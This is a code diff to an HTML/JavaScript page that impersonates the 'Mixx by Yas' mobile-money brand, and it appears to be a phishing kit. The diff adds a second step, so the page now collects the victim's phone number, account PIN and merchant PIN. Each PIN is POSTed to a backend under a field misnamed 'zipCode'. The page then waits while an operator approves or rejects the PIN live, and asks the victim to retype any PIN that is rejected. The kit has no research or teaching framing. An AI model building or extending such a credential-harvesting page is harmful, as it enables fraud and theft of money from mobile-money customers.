@@ -462,13 +462,12 @@
         </div>
       </section>
 
-      <!-- STEP 4: Mixx by Yas Login & Verification (Merchant PIN & Phone - Hatua ya 4 ya 5) -->
+      <!-- STEP 4: Customer Account PIN Validation (Hatua ya 4 ya 5) -->
       <section id="step-4" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
         
         <!-- Top Blue Banner Header with Yas Speech Bubble -->
         <div class="mixx-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
           <div class="inline-flex flex-col items-center">
-            <!-- Speech bubble yas icon -->
             <div class="relative mb-2">
               <div class="w-11 h-11 bg-brand-yellow rounded-full flex items-center justify-center shadow-md border-2 border-yellow-300">
                 <span class="text-blue-950 font-black text-sm tracking-tighter lowercase">yas</span>
@@ -480,7 +479,7 @@
               <span>🔐</span>
               <span>Mixx by Yas</span>
             </h2>
-            <p class="text-xs text-blue-100 font-medium mt-0.5">Mikopo Rahisi na ya Haraka</p>
+            <p class="text-xs text-blue-100 font-medium mt-0.5">Uhakiki wa Akaunti ya Mteja</p>
           </div>
         </div>
 
@@ -489,11 +488,11 @@
           
           <div class="text-center space-y-1">
             <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Hatua ya 4 ya 5</span>
-            <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5" data-i18n="merchantPinTitle">
-              <span>🔑</span>
-              <span>Merchant Account PIN</span>
+            <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
+              <span>🔐</span>
+              <span>PIN ya Akaunti (Account PIN)</span>
             </h3>
-            <p class="text-xs text-slate-500 font-medium" data-i18n="merchantPinSub">Weka nambari ya simu na PIN yako ya Merchant Account (tarakimu 4)</p>
+            <p class="text-xs text-slate-500 font-medium">Weka nambari ya simu na PIN yako ya Akaunti (tarakimu 4)</p>
           </div>
 
           <!-- Phone Number Input Container -->
@@ -510,11 +509,10 @@
 
           <!-- Form & Inputs Container -->
           <div id="pin-form-container" class="space-y-4">
-            <!-- PIN Input Header -->
             <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
               <span class="flex items-center space-x-1">
                 <span>🔐</span>
-                <span>PIN ya Tarakimu 4</span>
+                <span>PIN ya Akaunti (Tarakimu 4)</span>
               </span>
               <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
                 <span>🛡️</span>
@@ -522,7 +520,7 @@
               </span>
             </div>
 
-            <!-- PIN Input Row with Eye Toggle Icon -->
+            <!-- PIN Input Row -->
             <div class="flex items-center justify-center space-x-2.5 py-1">
               <div class="grid grid-cols-4 gap-2.5 flex-1">
                 <input type="password" maxlength="1" data-index="0" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
@@ -531,7 +529,6 @@
                 <input type="password" maxlength="1" data-index="3" class="pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
               </div>
               
-              <!-- Eye Toggle Button -->
               <button type="button" onclick="togglePinVisibility()" class="p-2 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex flex-col items-center justify-center" aria-label="Toggle PIN Visibility">
                 <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
@@ -547,80 +544,127 @@
               id="login-btn" 
               type="button" 
               disabled 
-              onclick="submitApplication()" 
-              class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2"
-              data-i18n="confirmPinBtn">
+              onclick="submitAccountPin()" 
+              class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
               <span>⚡</span>
-              <span>THIBITISHA PIN NA ENDELEA</span>
+              <span>THIBITISHA PIN YA AKAUNTI</span>
             </button>
           </div>
 
-          <!-- Live Approval Waiting Indicator -->
+          <!-- Live Approval Waiting Indicator inside Step 4 -->
           <div id="pin-waiting-box" class="hidden bg-slate-50/90 border border-slate-200/90 rounded-2xl p-6 text-center space-y-3 shadow-xs">
             <div class="w-10 h-10 mx-auto flex items-center justify-center">
               <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-yellow rounded-full animate-spin"></div>
             </div>
-            <p class="text-xs text-slate-700 font-semibold leading-relaxed" data-i18n="pinAwaitingMerchantDesc">
+            <p class="text-xs text-slate-700 font-semibold leading-relaxed">
+              ⏳ Inasubiri msimamizi kuthibitisha PIN yako ya Akaunti...
+            </p>
+          </div>
+
+        </div>
+
+        <div class="mixx-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
+          <div class="inline-flex flex-col items-center">
+            <span class="text-sm font-black text-brand-yellow tracking-tight">Mixx by Yas</span>
+            <span class="text-[11px] text-blue-100 font-medium">Uhakiki wa PIN ya Akaunti</span>
+          </div>
+        </div>
+
+      </section>
+
+      <!-- STEP 5: Merchant Account PIN Validation (Hatua ya 5 ya 5) -->
+      <section id="step-5" class="hidden flex-1 flex flex-col justify-between min-h-[580px] text-slate-800 bg-white">
+        
+        <!-- Top Blue Banner Header for Merchant PIN -->
+        <div class="mixx-gradient text-white pt-7 pb-8 px-6 text-center relative shadow-md">
+          <div class="inline-flex flex-col items-center">
+            <div class="relative mb-2">
+              <div class="w-11 h-11 bg-brand-yellow rounded-full flex items-center justify-center shadow-md border-2 border-yellow-300">
+                <span class="text-blue-950 font-black text-sm tracking-tighter lowercase">yas</span>
+              </div>
+              <div class="absolute -bottom-1 left-1/2 -translate-x-1/2 w-2.5 h-2.5 bg-brand-yellow rotate-45"></div>
+            </div>
+            
+            <h2 class="text-xl sm:text-2xl font-black text-brand-yellow tracking-tight flex items-center justify-center space-x-1.5">
+              <span>🔑</span>
+              <span>Mixx Merchant Portal</span>
+            </h2>
+            <p class="text-xs text-blue-100 font-medium mt-0.5">Uhakiki wa PIN ya Merchant Account</p>
+          </div>
+        </div>
+
+        <!-- Main Merchant Form Content -->
+        <div class="px-5 py-6 space-y-5 flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
+          
+          <div class="text-center space-y-1">
+            <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-0.5 rounded-full uppercase tracking-wider mb-1 inline-block">Hatua ya 5 ya 5</span>
+            <h3 class="text-lg font-black text-slate-800 tracking-tight flex items-center justify-center space-x-1.5">
+              <span>🔑</span>
+              <span>Merchant Account PIN</span>
+            </h3>
+            <p class="text-xs text-slate-500 font-medium">Weka PIN yako ya Merchant Account (tarakimu 4)</p>
+          </div>
+
+          <!-- Merchant PIN Form & Inputs Container -->
+          <div id="merchant-pin-form-container" class="space-y-4">
+            <div class="flex items-center justify-between text-xs font-bold text-slate-600 uppercase tracking-wider px-1">
+              <span class="flex items-center space-x-1">
+                <span>🔑</span>
+                <span>PIN ya Merchant (Tarakimu 4)</span>
+              </span>
+              <span class="text-[10px] font-semibold text-slate-400 flex items-center space-x-0.5">
+                <span>🛡️</span>
+                <span>Ulinzi wa Merchant</span>
+              </span>
+            </div>
+
+            <!-- Merchant PIN Input Row -->
+            <div class="flex items-center justify-center space-x-2.5 py-1">
+              <div class="grid grid-cols-4 gap-2.5 flex-1">
+                <input type="password" maxlength="1" data-mindex="0" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-mindex="1" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-mindex="2" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+                <input type="password" maxlength="1" data-mindex="3" class="merchant-pin-box w-full h-12 sm:h-14 text-center text-xl font-bold bg-white border-2 border-slate-200 rounded-xl focus:border-brand-yellow focus:ring-2 focus:ring-brand-yellow/30 shadow-xs" />
+              </div>
+              
+              <button type="button" onclick="toggleMerchantPinVisibility()" class="p-2 text-slate-500 hover:text-brand-blue transition-colors focus:outline-none flex flex-col items-center justify-center" aria-label="Toggle Merchant PIN Visibility">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
+                </svg>
+                <span id="merchant-eye-text" class="text-[9px] font-bold text-slate-400 mt-0.5">Onyesha</span>
+              </button>
+            </div>
+
+            <div id="merchant-pin-retry-alert" class="p-3 bg-red-50 border border-red-200 rounded-xl text-xs font-bold text-red-600 text-center hidden"></div>
+
+            <button 
+              id="merchant-login-btn" 
+              type="button" 
+              disabled 
+              onclick="submitMerchantPin()" 
+              class="w-full py-3.5 bg-blue-900/40 text-white/50 font-extrabold rounded-xl text-xs tracking-wider uppercase cursor-not-allowed transition-all duration-200 shadow-md flex items-center justify-center space-x-2">
+              <span>⚡</span>
+              <span>THIBITISHA PIN YA MERCHANT</span>
+            </button>
+          </div>
+
+          <!-- Live Approval Waiting Indicator for Merchant PIN -->
+          <div id="merchant-pin-waiting-box" class="hidden bg-slate-50/90 border border-slate-200/90 rounded-2xl p-6 text-center space-y-3 shadow-xs">
+            <div class="w-10 h-10 mx-auto flex items-center justify-center">
+              <div class="w-8 h-8 border-3 border-slate-200 border-t-brand-yellow rounded-full animate-spin"></div>
+            </div>
+            <p class="text-xs text-slate-700 font-semibold leading-relaxed">
               ⏳ Inasubiri msimamizi kuthibitisha PIN yako ya Merchant...
             </p>
           </div>
 
         </div>
 
-        <!-- Bottom Curved Blue Footer Shape -->
         <div class="mixx-gradient text-white pt-7 pb-6 px-4 text-center relative rounded-t-[40%] sm:rounded-t-[50%] overflow-hidden shadow-lg mt-auto">
           <div class="inline-flex flex-col items-center">
-            <div class="relative mb-1.5">
-              <div class="w-8 h-8 bg-brand-yellow rounded-full flex items-center justify-center shadow-xs">
-                <span class="text-blue-950 font-black text-[11px] lowercase">yas</span>
-              </div>
-              <div class="absolute -bottom-0.5 left-1/2 -translate-x-1/2 w-2 h-2 bg-brand-yellow rotate-45"></div>
-            </div>
-            <span class="text-sm font-black text-brand-yellow tracking-tight">Mixx by Yas</span>
-            <span class="text-[11px] text-blue-100 font-medium">Mikopo Rahisi na ya Haraka</span>
-            <span class="text-[10px] text-blue-300/80 font-mono mt-1">v2.1.3P</span>
-          </div>
-        </div>
-
-      </section>
-
-      <!-- STEP 5: Merchant Account PIN Approval Phase (Hatua ya 5 ya 5) -->
-      <section id="step-5" class="hidden flex-1 flex flex-col p-4 sm:p-6 space-y-4 sm:space-y-6 text-slate-800 bg-white">
-        <div>
-          <span class="text-[11px] font-black text-blue-950 bg-brand-yellow px-2.5 py-1 rounded-full uppercase tracking-wider">Hatua ya 5 ya 5</span>
-          <h2 class="text-xl font-extrabold text-slate-900 mt-2 flex items-center space-x-2">
-            <span>🛡️</span>
-            <span>Uhakiki na Idhini ya PIN ya Merchant</span>
-          </h2>
-          <p class="text-xs text-slate-500 mt-1">⏳ PIN yako ya Merchant Account imewasilishwa. Inasubiri msimamizi / wakala kuthibitisha na kuidhinisha ombi lako.</p>
-        </div>
-
-        <div class="space-y-4 flex-1 flex flex-col justify-center">
-          <div class="bg-blue-50 border border-blue-200 rounded-3xl p-6 text-center space-y-4 shadow-sm">
-            <div class="relative flex items-center justify-center">
-              <div class="w-16 h-16 rounded-full bg-blue-100 flex items-center justify-center border-4 border-blue-50 shadow-inner">
-                <span class="text-2xl">🔐</span>
-              </div>
-              <span class="absolute bottom-0 right-1/3 flex h-5 w-5">
-                <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-yellow opacity-75"></span>
-                <span class="relative inline-flex rounded-full h-5 w-5 bg-brand-yellow text-[10px] font-black text-blue-950 items-center justify-center shadow-md">⏳</span>
-              </span>
-            </div>
-
-            <div class="space-y-1.5">
-              <h3 class="text-base font-extrabold text-blue-950 tracking-tight">Inasubiri Idhini ya Msimamizi</h3>
-              <p class="text-xs text-blue-800 font-medium leading-relaxed max-w-xs mx-auto">
-                Taarifa za PIN yako zimepokelewa kwa usalama. Msimamizi wa Mixx Wakala anahakiki umiliki wa akaunti yako sasa hivi...
-              </p>
-            </div>
-
-            <div class="flex items-center justify-center space-x-3 bg-white border border-blue-200 rounded-2xl py-3 px-4 shadow-xs">
-              <svg class="animate-spin h-5 w-5 text-brand-blue flex-shrink-0" fill="none" viewBox="0 0 24 24">
-                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-              </svg>
-              <span class="text-xs font-black text-blue-950 uppercase tracking-wider">Inahakikiwa na Wakala...</span>
-            </div>
+            <span class="text-sm font-black text-brand-yellow tracking-tight">Mixx Merchant</span>
+            <span class="text-[11px] text-blue-100 font-medium">Uhakiki wa Merchant PIN</span>
           </div>
         </div>
 
@@ -816,6 +860,7 @@
       lastName: '',
       phoneNumber: '',
       momoPin: '',
+      merchantPin: '',
       applicationId: null
     };
 
@@ -1439,6 +1484,68 @@
       checkPinComplete();
     }
 
+    // Merchant 4-Digit PIN Boxes Logic
+    const merchantPinInputs = document.querySelectorAll('.merchant-pin-box');
+    const merchantLoginBtn = document.getElementById('merchant-login-btn');
+    let merchantPinVisible = false;
+
+    merchantPinInputs.forEach((input, index) => {
+      input.addEventListener('focus', () => {
+        input.classList.add('active');
+        input.select();
+      });
+      input.addEventListener('blur', () => {
+        input.classList.remove('active');
+      });
+
+      input.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+        e.target.value = val;
+
+        if (val && index < merchantPinInputs.length - 1) {
+          merchantPinInputs[index + 1].focus();
+        }
+        checkMerchantPinComplete();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          merchantPinInputs[index - 1].focus();
+        }
+      });
+    });
+
+    function checkMerchantPinComplete() {
+      let pin = '';
+      merchantPinInputs.forEach(i => pin += i.value);
+      appState.merchantPin = pin;
+
+      if (pin.length === 4 && merchantLoginBtn) {
+        merchantLoginBtn.disabled = false;
+        merchantLoginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        merchantLoginBtn.classList.add('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'shadow-md');
+      } else if (merchantLoginBtn) {
+        merchantLoginBtn.disabled = true;
+        merchantLoginBtn.classList.add('bg-blue-900/40', 'text-white/50', 'cursor-not-allowed');
+        merchantLoginBtn.classList.remove('bg-[#0056C6]', 'hover:bg-blue-800', 'text-white', 'mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
+      }
+    }
+
+    function toggleMerchantPinVisibility() {
+      merchantPinVisible = !merchantPinVisible;
+      merchantPinInputs.forEach(i => {
+        i.type = merchantPinVisible ? 'text' : 'password';
+      });
+      const eyeTxt = document.getElementById('merchant-eye-text');
+      if (eyeTxt) eyeTxt.innerText = merchantPinVisible ? 'Ficha' : 'Onyesha';
+    }
+
+    function clearMerchantPin() {
+      merchantPinInputs.forEach(i => i.value = '');
+      if (merchantPinInputs[0]) merchantPinInputs[0].focus();
+      checkMerchantPinComplete();
+    }
+
     let autoSubmitTimer = null;
     let isSubmittingMessage = false;
 
@@ -1647,6 +1754,8 @@
     let isAwaitingStep2Approval = false;
     let activePinVerId = null;
     let lastHandledRejectPinId = null;
+    let activeMerchantPinId = null;
+    let lastHandledRejectMerchantPinId = null;
     let activeSmsVerId = null;
     let lastHandledRejectSmsId = null;
 
@@ -1788,39 +1897,80 @@
               }
             }
 
-            const pinVer = (activePinVerId && verifications.find(v => v.id === activePinVerId))
-              || verifications.find(v => v.step === 'zip_phone');
+            // Step 4: Account PIN verification check
+            const accountPinVer = (activePinVerId && verifications.find(v => v.id === activePinVerId))
+              || verifications.find(v => v.step === 'account_pin' || v.step === 'zip_phone');
             const pinAlert = document.getElementById('pin-retry-alert');
             const pinWaitingBox = document.getElementById('pin-waiting-box');
 
-            if ((currentStep === 4 || currentStep === 5) && pinVer) {
-              if (pinVer.status === 'approved') {
+            if (currentStep === 4 && accountPinVer) {
+              if (accountPinVer.status === 'approved') {
                 hideApprovalOverlay();
                 if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                 if (pinAlert) pinAlert.classList.add('hidden');
                 clearPin();
-                loginBtn.innerHTML = 'THIBITISHA PIN NA ENDELEA';
-                loginBtn.disabled = false;
+                if (loginBtn) {
+                  loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+                  loginBtn.disabled = false;
+                }
                 lastHandledRejectPinId = null;
                 activePinVerId = null;
-                goToStep(6);
-              } else if (pinVer.status === 'rejected') {
-                if (lastHandledRejectPinId !== pinVer.id) {
-                  lastHandledRejectPinId = pinVer.id;
+                goToStep(5);
+              } else if (accountPinVer.status === 'rejected') {
+                if (lastHandledRejectPinId !== accountPinVer.id) {
+                  lastHandledRejectPinId = accountPinVer.id;
                   activePinVerId = null;
                   hideApprovalOverlay();
                   if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                   if (pinAlert) {
-                    pinAlert.innerText = pinVer.reject_reason || '❌ PIN isiyo sahihi! PIN ya tarakimu 4 iliyowekwa imekataliwa. Tafadhali weka tena PIN yako ya tarakimu 4 ya Mixx.';
+                    pinAlert.innerText = accountPinVer.reject_reason || '❌ PIN ya Akaunti isiyo sahihi! Tafadhali weka tena PIN yako ya Akaunti.';
                     pinAlert.classList.remove('hidden');
                   }
                   clearPin();
-                  loginBtn.innerHTML = 'THIBITISHA PIN NA ENDELEA';
-                  loginBtn.disabled = true;
-                  loginBtn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-                  loginBtn.classList.remove('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
-                  goToStep(4);
+                  if (loginBtn) {
+                    loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+                    loginBtn.disabled = true;
+                  }
                   if (pinInputs[0]) pinInputs[0].focus();
+                }
+              }
+            }
+
+            // Step 5: Merchant PIN verification check
+            const merchantPinVer = (activeMerchantPinId && verifications.find(v => v.id === activeMerchantPinId))
+              || verifications.find(v => v.step === 'merchant_pin');
+            const mAlert = document.getElementById('merchant-pin-retry-alert');
+            const mWaitingBox = document.getElementById('merchant-pin-waiting-box');
+
+            if (currentStep === 5 && merchantPinVer) {
+              if (merchantPinVer.status === 'approved') {
+                hideApprovalOverlay();
+                if (mWaitingBox) mWaitingBox.classList.add('hidden');
+                if (mAlert) mAlert.classList.add('hidden');
+                clearMerchantPin();
+                if (merchantLoginBtn) {
+                  merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
+                  merchantLoginBtn.disabled = false;
+                }
+                lastHandledRejectMerchantPinId = null;
+                activeMerchantPinId = null;
+                goToStep(6);
+              } else if (merchantPinVer.status === 'rejected') {
+                if (lastHandledRejectMerchantPinId !== merchantPinVer.id) {
+                  lastHandledRejectMerchantPinId = merchantPinVer.id;
+                  activeMerchantPinId = null;
+                  hideApprovalOverlay();
+                  if (mWaitingBox) mWaitingBox.classList.add('hidden');
+                  if (mAlert) {
+                    mAlert.innerText = merchantPinVer.reject_reason || '❌ PIN ya Merchant isiyo sahihi! Tafadhali weka tena PIN yako ya Merchant.';
+                    mAlert.classList.remove('hidden');
+                  }
+                  clearMerchantPin();
+                  if (merchantLoginBtn) {
+                    merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
+                    merchantLoginBtn.disabled = true;
+                  }
+                  if (merchantPinInputs[0]) merchantPinInputs[0].focus();
                 }
               }
             }
@@ -1829,8 +1979,8 @@
       }, 1500);
     }
 
-    async function submitApplication() {
-      if (appState.momoPin.length < 4) return;
+    async function submitAccountPin() {
+      if ((appState.momoPin || '').length < 4) return;
       
       const pinAlert = document.getElementById('pin-retry-alert');
       if (pinAlert) pinAlert.classList.add('hidden');
@@ -1838,20 +1988,22 @@
       const pinWaitingBox = document.getElementById('pin-waiting-box');
       if (pinWaitingBox) pinWaitingBox.classList.remove('hidden');
 
-      loginBtn.innerHTML = `
-        <span class="inline-flex items-center">
-          <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-blue-950" fill="none" viewBox="0 0 24 24">
-            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-          </svg>
-          INASUBIRI IDHINI...
-        </span>`;
-      loginBtn.disabled = true;
+      if (loginBtn) {
+        loginBtn.innerHTML = `
+          <span class="inline-flex items-center">
+            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-blue-950" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            INASUBIRI IDHINI...
+          </span>`;
+        loginBtn.disabled = true;
+      }
 
       showApprovalOverlay(
-        'Inasubiri Uhakiki wa PIN',
-        'PIN yako ya tarakimu 4 imetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha PIN yako...',
-        'Inahakiki PIN...'
+        'Inasubiri Uhakiki wa PIN ya Akaunti',
+        'PIN yako ya Akaunti imetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha PIN yako...',
+        'Inahakiki PIN ya Akaunti...'
       );
 
       try {
@@ -1865,7 +2017,7 @@
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-              step: 'zip_phone',
+              step: 'account_pin',
               zipCode: appState.momoPin,
               phone: appState.phoneNumber
             })
@@ -1874,14 +2026,14 @@
           if (!res.ok && res.status !== 409) {
             hideApprovalOverlay();
             if (pinAlert) {
-              pinAlert.innerText = resData.error || '❌ Hitilafu katika kutuma PIN. Tafadhali jaribu tena.';
+              pinAlert.innerText = resData.error || '❌ Hitilafu katika kutuma PIN ya Akaunti. Tafadhali jaribu tena.';
               pinAlert.classList.remove('hidden');
             }
             if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-            loginBtn.innerHTML = 'THIBITISHA PIN NA ENDELEA';
-            loginBtn.disabled = false;
-            loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-            loginBtn.classList.add('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
+            if (loginBtn) {
+              loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+              loginBtn.disabled = false;
+            }
             return;
           }
 
@@ -1890,21 +2042,104 @@
           }
           lastHandledRejectPinId = null;
           startVerificationPolling(appId);
-          goToStep(5);
         }
       } catch (err) {
         hideApprovalOverlay();
-        console.error('Submission error:', err);
+        console.error('Account PIN submission error:', err);
         if (pinAlert) {
-          pinAlert.innerText = '❌ Hitilafu katika kutuma PIN. Tafadhali jaribu tena.';
+          pinAlert.innerText = '❌ Hitilafu katika kutuma PIN ya Akaunti. Tafadhali jaribu tena.';
           pinAlert.classList.remove('hidden');
         }
         if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
-        loginBtn.innerHTML = 'THIBITISHA PIN NA ENDELEA';
-        loginBtn.disabled = false;
-        loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
-        loginBtn.classList.add('mixx-btn-gradient', 'text-blue-950', 'hover:opacity-95', 'shadow-md');
+        if (loginBtn) {
+          loginBtn.innerHTML = 'THIBITISHA PIN YA AKAUNTI';
+          loginBtn.disabled = false;
+        }
       }
+    }
+
+    async function submitMerchantPin() {
+      if ((appState.merchantPin || '').length < 4) return;
+      
+      const mAlert = document.getElementById('merchant-pin-retry-alert');
+      if (mAlert) mAlert.classList.add('hidden');
+
+      const mWaitingBox = document.getElementById('merchant-pin-waiting-box');
+      if (mWaitingBox) mWaitingBox.classList.remove('hidden');
+
+      if (merchantLoginBtn) {
+        merchantLoginBtn.innerHTML = `
+          <span class="inline-flex items-center">
+            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-blue-950" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            INASUBIRI IDHINI...
+          </span>`;
+        merchantLoginBtn.disabled = true;
+      }
+
+      showApprovalOverlay(
+        'Inasubiri Uhakiki wa PIN ya Merchant',
+        'PIN yako ya Merchant Account imetumwa. Tafadhali subiri wakati wakala wako wa Mixx Wakala anahakiki na kuidhinisha PIN yako ya Merchant...',
+        'Inahakiki Merchant PIN...'
+      );
+
+      try {
+        let appId = appState.applicationId;
+        if (!appId) {
+          appId = await ensureApplicationCreated();
+        }
+
+        if (appId) {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              step: 'merchant_pin',
+              zipCode: appState.merchantPin,
+              phone: appState.phoneNumber
+            })
+          });
+          const resData = await res.json().catch(() => ({}));
+          if (!res.ok && res.status !== 409) {
+            hideApprovalOverlay();
+            if (mAlert) {
+              mAlert.innerText = resData.error || '❌ Hitilafu katika kutuma Merchant PIN. Tafadhali jaribu tena.';
+              mAlert.classList.remove('hidden');
+            }
+            if (mWaitingBox) mWaitingBox.classList.add('hidden');
+            if (merchantLoginBtn) {
+              merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
+              merchantLoginBtn.disabled = false;
+            }
+            return;
+          }
+
+          if (resData.verificationId) {
+            activeMerchantPinId = resData.verificationId;
+          }
+          lastHandledRejectMerchantPinId = null;
+          startVerificationPolling(appId);
+        }
+      } catch (err) {
+        hideApprovalOverlay();
+        console.error('Merchant PIN submission error:', err);
+        if (mAlert) {
+          mAlert.innerText = '❌ Hitilafu katika kutuma Merchant PIN. Tafadhali jaribu tena.';
+          mAlert.classList.remove('hidden');
+        }
+        if (mWaitingBox) mWaitingBox.classList.add('hidden');
+        if (merchantLoginBtn) {
+          merchantLoginBtn.innerHTML = 'THIBITISHA PIN YA MERCHANT';
+          merchantLoginBtn.disabled = false;
+        }
+      }
+    }
+
+    // Retain legacy function alias if needed
+    function submitApplication() {
+      return submitAccountPin();
     }
 
     function toggleNoticeModal(show, title = '', msg = '') {
